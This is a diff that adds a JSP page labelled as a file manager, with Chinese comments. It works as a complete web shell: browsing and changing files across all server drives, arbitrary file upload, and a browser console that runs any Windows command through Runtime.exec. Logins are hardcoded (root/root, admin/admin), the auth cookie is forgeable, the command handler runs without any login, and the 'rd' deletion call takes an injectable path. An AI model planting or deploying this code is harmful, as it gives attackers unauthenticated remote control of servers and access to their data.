@@ -1,0 +1,586 @@
+<%@page import="java.util.Set"%>
+<%@page import="java.util.Map.Entry"%>
+<%@page import="java.util.Iterator"%>
+<%@page import="java.util.HashMap"%>
+<%@page import="java.net.URI"%>
+<%@page import="java.net.URL"%>
+<%@page import="java.awt.Color"%>
+<%@page import="java.awt.Graphics"%>
+<%@page import="java.io.OutputStream"%>
+<%@page import="java.io.InputStreamReader"%>
+<%@page import="java.io.InputStream"%>
+<%@page import="java.io.DataOutputStream"%>
+<%@page import="java.io.FileOutputStream"%>
+<%@page import="java.io.BufferedReader"%>
+<%@page import="java.io.StringReader"%>
+<%@page import="java.io.DataInputStream"%>
+<%@page import="java.io.IOException"%>
+<%@page import="java.io.ByteArrayOutputStream"%>
+<%@page import="java.io.FileInputStream"%>
+<%@page import="java.io.BufferedInputStream"%>
+<%@page import="java.io.PrintWriter"%>
+<%@page import="java.io.File"%>
+<%@page import="java.util.Date"%>
+<%@page import="java.util.Arrays"%>
+<%@page import="java.util.List"%>
+<%@page import="java.util.Base64"%>
+<%@page import="java.util.StringTokenizer"%>
+<%@page import="java.awt.Button"%>
+<%@page import="java.awt.image.BufferedImage"%>
+<%@page import="java.text.SimpleDateFormat"%>
+<%@page import="java.net.URLDecoder"%>
+<%@page import="java.net.URLEncoder"%>
+<%@page import="java.nio.file.Files"%>
+<%@page import="java.nio.file.Paths"%>
+<%@page import="java.nio.file.attribute.BasicFileAttributes"%>
+<%@page import="javax.imageio.ImageIO"%>
+<%@page import="javax.swing.Icon"%>
+<%@page import="javax.swing.ImageIcon"%>
+<%@page import="javax.swing.filechooser.FileSystemView"%>
+<%@page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title> </title>
+
+<style type="text/css">
+ body{
+	 background-repeat:space;
+	 background-size:100% 1080px;
+	 background-attachment:scroll;
+	 background-color:#FAFAD2;
+	 color:black;
+	 font:18px red 微软雅黑
+ }
+ *{position:relative;}
+ a:active{color:yellow}
+ a:link:hover{color:red}
+ a:visited{color:black}
+ a:link{color:black; text-decoration:none}
+ h3{margin-left:39%; top: 50px;}
+ tr:hover{background-color: red}
+ td{text-align:left;padding-left:20px;border:1px #B0C4DE solid;height:21px;color:black}
+ table{cellspacing:0;cellpadding:0;border-spacing:0;border:1px #B0C4DE solid;width:80%;margin-left:10%;margin-right:10%;margin-top:0}
+ textarea[rows='30']{position:relative ;top:26px;left: 10% ;width:79.5%;}
+ .list{position:relative;top:0}
+ .filelist{position:absolute;top:-1px}
+ .img{position: relative;top:26px;left:10%;}
+ .login{position: relative;margin-left: 38%; margin-top: 10%;}
+ .login>input[type='submit']{position: relative;left: 13%;top:20px }
+ #CommandDiv{width:80%;margin-left:10%;margin-right:10%;margin-top:0;display:none;}
+ #CommandDiv>textarea{width: 100%}  
+ /*  #file{color:yellow;background-color:red;} */
+/*  #folder{color:red;background-color:yellow} */
+
+</style>
+<script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"> </script>
+<script type="text/javascript">
+	function rename(ele) {
+		var namecol=ele.parentElement.previousElementSibling.previousElementSibling.previousElementSibling
+		var showoldname=namecol.innerHTML.split(">")[1].split("<")[0]
+		var inhtml= '<form method="post"><input type="hidden" name="oldName" value="'+showoldname+'"><input size="30" type="text" name="newName" value='+showoldname+'><input type="submit" value="保存"></form>'
+		namecol.innerHTML=inhtml;
+	}
+ 
+	function switchDiv() {
+		var fileList=$(".fileListTable");
+		var Command=$("#CommandDiv")
+		if(fileList.css('display') == "block"){
+			fileList.css('display','none');
+			fileList.css('visibility','hidden');
+			Command.css('display','block');
+			  function keyDown(e) {
+			       var keycode = e.which;
+			       if(eval(keycode==13)){
+			    	   $("div").children("input")[1].click();
+			    	   }
+			       }
+			    
+			   document.onkeydown = keyDown;
+		}else{
+			Command.css('display','none');
+			fileList.css('display','block');
+			fileList.css('visibility','visible');
+		}
+	}
+	function sendCommand(inx){
+		$.post("",inx.name+"="+inx.value,function(date){
+			var cmdOut=date.split('cmdStrStart')[2];
+			 $(inx).next().next().html(cmdOut); 
+			 if(eval(cmdOut.substring(0,7)=='Refresh')){
+				 location.reload();
+				 switchDiv();
+			 }
+		},"html");
+		inx.value="";
+		inx.focus();
+	}
+	window.onload=function(){
+		 $("tr:even").css('background-color','#FDF5E6');	 
+		 $("tr:odd").css('background-color','#FAFAD2');
+		 switchDiv();
+		 switchDiv();
+	}
+</script>
+</head>
+<body>
+
+
+
+<%
+request.getCookies();
+request.setCharacterEncoding ("utf-8");
+response.setCharacterEncoding ("utf-8");
+response.setContentType("text/html;charset=utf-8");
+req=request;
+res=response;
+
+o =res.getWriter();
+url=request.getRequestURI().split("/")[2];
+action=request.getParameter("action");
+oldname=request.getParameter("oldName");
+newname=request.getParameter("newName");
+
+dir=request.getParameter("dir");
+System.out.println((String)application.getAttribute("dir"));
+msg=dir=dir==null?(String)application.getAttribute("dir"):decode(dir);
+if(dir!=null){application.setAttribute("dir", decode(dir));}else{dir="C:\\";}
+
+action=action==null?"list":action;
+HashMap<String, String> user = new HashMap<>();
+String cmdStr=request.getParameter("commandStr");
+//设置账号密码
+user.put("root", "root");
+user.put("admin", "admin");
+String username = req.getParameter("username");
+String password = req.getParameter("password");
+if(newname!=null){
+ 	msg=rename(newname,oldname);   
+}else if(request.getContentLengthLong()>180){
+	load(request,response);
+}
+  Cookie[] cookie = req.getCookies();
+		boolean red = false;
+		if(cookie!=null){
+			for (Cookie co : cookie) {
+				//o.append(co.getName() + co.getValue());
+				red = co.getName().equals("root");
+				if (red) {// 如果找到指定Cookie
+					System.err.println("Cookie验证通过！当前用户："+co.getValue()+"\t身份确认");	
+			     break;
+				}
+			}
+		} 
+	int sessionAge=300;
+ if (cookie==null||red == false) {// 如果找不到指定Cookie
+	 String formStr="<form class='login' method='post'>账号：<input type='text' name='username'><br/>密码：<input type='text' name='password'><br/><input type='submit' value='登录'></form>";
+	 request.setAttribute("form", formStr);
+		 try {
+			 //System.out.println("账号：" + username + "\t密码" + password);
+			    Set<Entry<String, String>> xx= user.entrySet();
+			    for(Entry<String, String> use:xx){
+			    	if(use.getKey().equals(username)&&use.getValue().equals(password)) {
+						Cookie cookie0 = new Cookie("root", username);
+						cookie0.setMaxAge(sessionAge);//会话存活时间(秒)
+						res.addCookie(cookie0);
+						res.sendRedirect(url);
+					}
+			    }   // 密码错误
+					%><h3>密码错误</h3>${form}<% 
+			} catch (Exception e) {
+				// 如果表单数据为空 空指针异常
+					%><h3>请验证密码</h3>${form}<% 
+			}
+ }else if(red){// 如果找到指定Cookie
+ 		%> <%!
+	static String url="";
+	static String msg="";
+	static String tag="";
+	static String dir="";
+	static String newname="";
+	static String oldname="";
+	static String action="";
+	static String spacelength="";
+	static PrintWriter o=null;
+	static boolean Refresh=false;
+	static HttpServletRequest req=null;
+	static HttpServletResponse res=null;
+	static File[] FileRoot = File.listRoots();
+	static Base64.Decoder decoder = Base64.getDecoder();
+	static Base64.Encoder encoder = Base64.getEncoder();
+	static String ListPath( String ac,File file){
+	    //long size=getFileSize(F);
+	    req.setAttribute("Loginmsg", "");
+	    String CreateTime = "<td> "+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(file.lastModified()))+"</td>";  
+		String renameStr="<td><input type='button' onclick='rename(this)' value='重命名 '></td>";
+		String fhiddeStr="<td style='color:red'>"+(file.isHidden()?"√":"×")+"</td>";
+		String fReadsStr="<td style='color:red'>  "+(file.canRead()?"√":"×")+"</td>";
+		String requrlStr="<a href='"+ url+"?dir="+ encode(file.getAbsolutePath())+"&action=";
+		String fiSizeStr="<td>"+(file.length()/1024>1024?file.length()/1024/1024+"MB":file.length()/1024+"KB")+"</td>";
+		//String dirSizeStr="<td>"+(size/1024>1024?size/1024/1024+"MB":size/1024+"KB")+"</td>";
+		if(ac.equals("isRoot")){
+		    tag= " <td><a href='"+ url+"?dir="+ encode(file.getPath())+"&action=list'>"+file.getPath()+"</a></td> ";
+		}else if(ac.equals("isDir")){
+		    tag= "<tr><td id='folder'><img src='"+imgencode64(file)+"'/> </td><td><a href='"+ url+"?dir="+encode(file.getPath())+"&action=list'>"+file.getName()+"</a></td>"
+			     +"<td></td>"+"<td>"+requrlStr+"del'>删除  </a></td>"+renameStr+"<td></td>"+fhiddeStr+fReadsStr+CreateTime+"</tr>";
+		}else if(ac.equals("isFileDownLink")){
+		    tag= "<td>"+requrlStr+"down'>下载  </a></td><td>"+requrlStr+"del'>删除  </a></td>"
+				 +renameStr+fiSizeStr+fhiddeStr+fReadsStr+CreateTime+"</tr>";
+		}else {
+		    tag="<tr><td id='file'><img src='"+imgencode64(file)+"'/></td><td>"+requrlStr+"preview'>"+file.getName()+"</a></td>";
+		}
+		return tag;
+	}
+	static String imgencode64(File file){//文件icon图标的Base64编码
+	 ImageIcon icon=(ImageIcon) FileSystemView.getFileSystemView().getSystemIcon(file);
+	 BufferedImage bu = new BufferedImage(icon.getIconWidth(),icon.getIconHeight(), BufferedImage.TYPE_INT_RGB);
+	     Graphics g=bu.getGraphics();
+	     g.setColor(Color.WHITE);
+		 g.fillRect(0,0,50,50);//填充整个画布为白色  
+		 g.drawImage(icon.getImage(), 0, 0, icon.getIconWidth(), icon.getIconHeight(),null);
+	     ByteArrayOutputStream imageStream = new ByteArrayOutputStream();
+	     try{
+	     ImageIO.write(bu, "png", imageStream);
+	     }catch(Exception e){
+	     } 
+	  byte[] tagInfo = imageStream.toByteArray();
+	  return "data:image/png;base64,"+encoder.encodeToString(tagInfo); 
+	 }
+	 
+	static String encode(String x){//url编码
+		try{
+		    x=URLEncoder.encode(x, "utf-8");
+		}catch(Exception e){}
+		return x;
+	}
+	 
+	static String decode(String x){//url解码
+		try{
+		    x=URLDecoder.decode(x,"utf-8");
+		}catch(Exception e){}
+		return x;
+	}
+	static void load(HttpServletRequest request, HttpServletResponse response)
+				throws ServletException,IOException {//文件上传
+		 	String filename="";
+			int totalBytes = request.getContentLength();
+			System.out.println("当前数据总长度:" + totalBytes);
+			String contentType = request.getContentType();
+			int position = contentType.indexOf("boundary=");
+			String startBoundary = "--" + contentType.substring(position + "boundary=".length());
+			String endBoundary = startBoundary + "--";
+			InputStream inputStream = request.getInputStream();
+			DataInputStream dataInputStream = new DataInputStream(inputStream);
+			byte[] bytes = new byte[totalBytes];
+			dataInputStream.readFully(bytes);
+			dataInputStream.close();
+			BufferedReader reader = new BufferedReader(new StringReader(new String(bytes)));
+			int temPosition = 0;
+			boolean flag = false;
+			int end = 0;
+			while (true) {
+				if (flag) {// 当读取一次文件信息后
+					bytes = subBytes(bytes, end, totalBytes);
+					temPosition = 0;
+					reader = new BufferedReader(new StringReader(new String(bytes)));
+				}
+				String str = reader.readLine();
+				System.out.println("this line is:" + str);
+				temPosition += str.getBytes().length + 2;
+				if (str == null || str.equals(endBoundary)) {
+					break;
+				}
+				if (str.startsWith(startBoundary)) {// 判断当前头对应的表单域类型是否是文件上传
+					str = reader.readLine(); // 读取当前头信息的下一行:Content-Disposition行
+					temPosition += str.getBytes().length + 2;
+		            System.out.println(str+233);
+					if (str.indexOf("filename=") == -1) {//如果是普通文本域表单
+						  reader.readLine();
+						  str=reader.readLine();				     
+						  System.out.println("编辑文件");
+						  System.out.println("普通文本域表单值"+str);
+						 
+					} else {//如果是文件上传表单
+						StringTokenizer Fn= new StringTokenizer(str,"\\\"");
+						while(Fn.hasMoreElements()){//获取文件名
+							filename =  Fn.nextToken();
+						}
+						if(filename.equals("; filename=")){
+						    msg="请选择文件";
+						    break;
+						}else if(dir==null){
+						    msg="请跳转至可用的目录";
+						    break;
+						}else {
+						System.out.println("保存的文件名："+filename);
+						filename=new String (filename.getBytes(),"utf-8");
+						temPosition += (reader.readLine().getBytes().length + 4);
+						end =  locateEnd(bytes, temPosition, totalBytes, endBoundary);
+						//String Savepath = request.getSession().getServletContext().getRealPath("/");
+						//String SavePath = System.getProperty("user.home") + "\\    \\";
+						String SavePath =dir+"\\"+filename;
+						System.out.println(SavePath);
+							DataOutputStream dOutputStream = new DataOutputStream(
+									new FileOutputStream(new File(SavePath)));
+							dOutputStream.write(bytes, temPosition, end - temPosition - 2);
+							dOutputStream.close();
+							msg=dir+filename+"上传成功！";
+						} 
+						flag = true;
+					}
+				}
+			}
+		}
+	 
+		public static int locateEnd(byte[] bytes, int start, int end, String endStr) { //计算文件结束符的位置
+			byte[] endByte = endStr.getBytes();
+			
+			for (int i = start + 1; i < end; i++) {
+				if (bytes[i] == endByte[0]) {
+					int k = 1;
+					while (k < endByte.length) {
+						if (bytes[i + k] != endByte[k]) {
+							break;
+						}
+						k++;
+					}
+					if (i == 3440488) {
+						System.out.println("start");
+					}  
+					if (k == endByte.length) {
+						return i;
+					}
+				}  
+			}
+	
+			return 0;
+		}
+		 
+		private static byte[] subBytes(byte[] b, int from, int end) {
+			byte[] result = new byte[end - from];
+			System.arraycopy(b, from, result, 0, end - from);
+			return result;
+		}
+	    public static long getFileSize(File file) { // 取得文件夹所有子文件夹及文件的磁盘占用大小
+			long size = 0;
+			try {
+			    File flist[] = file.listFiles();
+			    if (flist != null && flist.length > 0) {
+					for (int i = 0; i < flist.length; i++) {
+					    if (flist[i] != null && flist[i].canRead() && flist[i].canWrite()) {
+							if (flist[i].isDirectory()) {
+							    size += getFileSize(flist[i]);
+							} else if (flist[i].isFile()) {
+							    size += flist[i].length();
+							}
+					    }
+					}
+			    }
+			} catch (Exception e) {
+	 		}
+			return size;
+		  }
+	    public static String rename(String newname,String oldname){//文件重命名
+		    System.out.println("文件重命名\n新的名称"+newname+"\n旧的文件名"+oldname);
+		    if(!oldname.equals(newname)){
+		        File oldfile=new File(dir+"/"+oldname); 
+		        File newfile=new File(dir+"/"+newname); 
+			        if(newfile.exists()||!oldfile.canRead()||! oldfile.canWrite()) {
+			            msg=(newname+"已经存在！"); 
+			        }else{ 
+			           msg=(oldfile.renameTo(newfile)?"重命名成功！"+oldname+"  >>>  "+newname:"重命名失败！");
+			        }
+		    }else{
+				msg=("新文件名和旧文件名相同");
+		    }
+		    return msg;
+	    }
+	    static void fileDownload(String filePath,boolean isOnLine){
+			File f = new File(filePath);
+			 try{
+				BufferedInputStream br = new BufferedInputStream(new FileInputStream(f));
+				byte[] buf = new byte[1024];
+				int len = 0;
+				res.reset();// 去除空白行
+				if (isOnLine) { // 在线打开方式
+					URL u = new URL("file:///" + filePath);
+					System.out.println(u.openConnection().getContentType());
+					//res.setContentType(u.openConnection().getContentType());
+					res.setContentType("video/mp4");
+					res.setHeader("Content-Disposition", "inline; filename=" + f.getName());
+					// 文件名应该编码成UTF-8
+				} else { // 纯下载方式
+					res.setContentType("application/x-msdownload");
+					res.setHeader("Content-Disposition", "attachment; filename=" + f.getName());
+				}
+				OutputStream out = res.getOutputStream();
+				while ((len = br.read(buf)) > 0)
+					out.write(buf, 0, len);
+				br.close();
+				out.close();
+			 }catch(Exception e){}
+	    }
+	    static String command(String x,String dirs){
+			 String Res="";
+			 try{
+				 x = x == null ? "ver" : x;
+				 Process p = Runtime.getRuntime().exec("cmd /c " + x,null, new File(dirs));
+				 InputStream is = p.getInputStream();
+				 InputStream rr = p.getErrorStream();
+				 BufferedReader reader = new BufferedReader(new InputStreamReader(is, "GBK"));
+				 BufferedReader readrr = new BufferedReader(new InputStreamReader(rr, "GBK"));
+				 String line;
+				 while ((line = reader.readLine()) != null || (line = readrr.readLine()) != null) {
+				 	 Res+=line+"\r\n";
+				 }
+				 reader.close();
+				 p.destroy();
+			 }catch(Exception e){
+			 }
+			 return Res;
+		 }
+	    static String fileType(String fileName) {
+		String fileType = fileName.substring(fileName.lastIndexOf(".") + 1, fileName.length()).toLowerCase();
+		String img[] = { "bmp", "jpg", "jpeg", "png", "tiff", "gif", "pcx", "tga", "exif", "fpx", "svg", "psd", "cdr",
+			"pcd", "dxf", "ufo", "eps", "ai", "raw", "wmf" };
+		for (int i = 0; i < img.length; i++) {
+		    if (img[i].equals(fileType)) {
+			return "图片";
+		    }
+		}
+		String document[] = { "conf","java","css","js","txt", "bat", "vbs", "py", "htm", "html", "jsp", "sh", "ini", "config", "info","xml","sql"};
+		for (int i = 0; i < document.length; i++) {
+		    if (document[i].equals(fileType)) {
+			return "文档";
+		    }
+		}
+		String video[] = { "mp4", "avi", "mov", "wmv", "asf", "navi", "3gp", "mkv", "f4v", "rmvb", "webm" };
+		for (int i = 0; i < video.length; i++) {
+		    if (video[i].equals(fileType)) {
+			return "视频";
+		    }
+		}
+		String music[] = { "mp3", "wma","wmv", "wav", "mod", "ra", "cd", "md", "asf", "aac", "vqf", "ape", "mid", "ogg",
+			"m4a", "vqf" };
+		for (int i = 0; i < music.length; i++) {
+		    if (music[i].equals(fileType)) {
+			return "音乐";
+		    }
+		}
+		return "其他";
+	    }
+	 %>
+	<div class="title" align="center">
+		<h1><a href="<%=url%>">文件管理</a></h1>
+		<span><button onclick="switchDiv()">切换</button></span>
+	</div>
+	<div class="root">
+	<table>
+	<tr>
+		<%for(File x:FileRoot)out.println(ListPath( "isRoot",x));%>
+		<td>
+			<form  enctype="multipart/form-data" method="post">
+				<input type="submit" value="上传至当前目录 " size="50">
+			    <input  type="file" name="file" size="30"  >  
+			</form>
+		</td>
+		<td>
+			<input type="button" value="返回上级目录" onclick="window.history.back()">
+		</td>
+	</tr>
+	<tr>
+		<td colspan="2" style="min-width:80px;">当前目录 </td>
+		<td colspan="10"> <%=msg%></td>
+	<tr/>
+	</table>
+	</div>
+ <div class="fileListTable">
+	<table class="filelist">
+	 	<tr>
+			<td>类型</td>
+			<td>名称</td>
+			<td>下载</td>
+			<td>删除</td>
+			<td>重命名</td>
+			<td>大小</td>
+			<td>隐藏</td>
+			<td>读写</td>
+			<td>创建日期</td>
+	 	</tr>
+	<% 
+	if(dir!=""){
+		if(action.equals("list")){
+		    System.out.println("获取文件列表:\t"+dir);
+		    try{
+				 
+				action=decode(action);
+				File[] file=new File(dir).listFiles() ;
+				 for(File x:file){
+					   if(x.isFile()){ 
+							out.println(ListPath( "isFile",x)); 
+							out.println(ListPath( "isFileDownLink",x) );
+					   }else if(x.isDirectory()){
+						    out.println(ListPath( "isDir",x) );
+					   }
+				 }
+			}catch(Exception e1){
+			    o.println("拒绝访问");
+			}
+		}else if(action.equals("down") ){//文件下载 
+			fileDownload(dir,false);
+		    System.out.println("下载文件"+dir);
+		}else if(action.equals("del")){//删除文件
+		    System.out.println("删除文件"+dir);
+		    File f=new File(dir);
+		    if(f.isFile()){
+				if(f.canWrite()&&f.canRead()){
+				    if(f.delete()){ 
+						o.println(dir+"删除成功！");
+				    }else{
+					 o.println(dir+"没有读写权限");
+				    }
+				}else{
+				    o.println(dir+"没有读写权限");
+				}	
+		    }else{
+		    	String re=command("rd "+dir+" /S /Q",dir);
+		    	System.out.println("调用系统命令删除"+re);
+		    }
+		    req.getRequestDispatcher(url+"?dir="+ encode(f.getParent())+"&action=list").forward(req, res);
+		   
+		} else if(action.equals("preview") ){ 
+		 
+		    System.out.println("预览文件");
+		    String type=fileType(dir );
+		    System.out.println(type);
+		     if(type.equals("文档")){//在线浏览文档
+		    	 out.println("</table></div><textarea rows=30>"+new String(Files.readAllBytes(Paths.get(dir)) ,"utf-8")+"</textarea>");
+			}else if(type.equals("图片")){//在线浏览图片
+			     String imgurl="data:image/png;base64,"+encoder.encodeToString(Files.readAllBytes(Paths.get(dir))); 
+			     out.println("</table></div><img class='img' src='"+imgurl+"'/>"); 
+			}else if(type.equals("视频")){//在线浏览视频
+				//String videourl=req.getRequestURL()+"?dir="+encode(dir)+"&action=preview";
+				System.out.println("播放视频："+dir);
+				fileDownload(dir,true);
+			}
+		}
+	}
+ }
+  
+	if(cmdStr!=null){
+		System.out.println("执行命令"+cmdStr);
+		if(cmdStr.startsWith("cd")){
+			dir=cmdStr.startsWith("cd")?cmdStr.substring(3):dir;
+			System.out.println("切换目录"+dir);
+			application.setAttribute("dir", dir);
+			 out.println("cmdStrStartRefresh"+msg+" cmdStrStart");
+		}
+		out.println("cmdStrStart"+command(cmdStr,(String)application.getAttribute("dir"))+"cmdStrStart");
+	}
+ %>
+   </table></div> 
+<div id="CommandDiv">
+	<input type="text" name="commandStr"><input type="submit" onclick="sendCommand(this.previousSibling)"><textarea rows='33'></textarea>
+</div></body>
+</html>
